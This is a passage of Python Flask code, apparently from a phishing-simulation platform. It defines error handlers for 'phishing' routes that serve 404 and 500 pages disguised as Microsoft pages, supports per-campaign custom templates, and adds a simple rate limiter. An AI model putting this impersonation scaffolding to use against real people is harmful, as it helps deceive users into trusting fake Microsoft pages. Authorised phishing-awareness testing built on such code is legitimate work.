        <p>The page you are looking for might have been removed, had its name changed, or is temporarily unavailable.</p>
        <p><a href="https://www.microsoft.com">Return to Microsoft.com</a></p>
    </div>
</body>
</html>
"""


@phishing_bp.errorhandler(404)
def phishing_not_found(error):
    """Custom 404 handler for phishing routes"""
    # Log the attempt for security monitoring
    log_security_event(
        'phishing_404',
        f'404 on phishing endpoint: {request.path}',
        {
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent'),
            'referer': request.headers.get('Referer')
        }
    )

    # Check for per-campaign custom 404 (inbound campaigns only)
    campaign_obj = g.get('campaign_obj')
    if campaign_obj and campaign_obj.campaign_type == 'inbound':
        config = campaign_obj.config or {}
        custom_body = config.get('custom_404_body', '').strip()
        template_id = config.get('custom_404_template_id')

        if custom_body:
            return custom_body, 404

        if template_id:
            template = Template.query.get(template_id)
            if template and template.template_html:
                try:
                    template_context = {
                        'campaign': {
                            'name': campaign_obj.name,
                            'uid': campaign_obj.uid
                        },
                        'request': {
                            'ip_address': request.remote_addr,
                            'user_agent': request.headers.get('User-Agent'),
                            'path': request.path
                        },
                        'variables': campaign_obj.variables or {}
                    }
                    rendered = render_sandboxed(template.template_html, template_context)
                    return rendered, 404
                except Exception as e:
                    logger.warning(f"Failed to render custom 404 template: {e}")

    return DEFAULT_404_HTML, 404

@phishing_bp.errorhandler(500)
def phishing_server_error(error):
    """Custom 500 handler for phishing routes"""
    # Log the error
    logger.exception("Server error in phishing endpoint")
    
    # Return generic error page
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Service unavailable</title>
        <style>
            body { font-family: 'Segoe UI', sans-serif; margin: 50px; }
            .container { max-width: 600px; }
            h1 { color: #d13438; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Service temporarily unavailable</h1>
            <p>We're experiencing technical difficulties. Please try again later.</p>
            <p><a href="https://www.microsoft.com">Return to Microsoft.com</a></p>
        </div>
    </body>
    </html>
    """, 500

# Rate limiting decorator (can be applied to routes)
from functools import wraps
from collections import defaultdict
from time import time

# Simple in-memory rate limiting
_rate_limits = defaultdict(list)

def rate_limit(max_requests=10, window=60):
    """
    Rate limiting decorator
    
    Args:
        max_requests: Maximum requests allowed
        window: Time window in seconds
    """
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            # Get client IP
            client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
            now = time()
            
            # Clean old entries
            _rate_limits[client_ip] = [
                timestamp for timestamp in _rate_limits[client_ip]
                if now - timestamp < window
            ]
            
            # Check rate limit
            if len(_rate_limits[client_ip]) >= max_requests:
                log_security_event(
                    'rate_limit_exceeded',
                    f'Client {client_ip} exceeded rate limit',
                    {'requests_in_window': len(_rate_limits[client_ip])}
                )
                abort(429)  # Too Many Requests
            
            # Add current request
            _rate_limits[client_ip].append(now)
            
            return f(*args, **kwargs)
        return wrapper
    return decorator
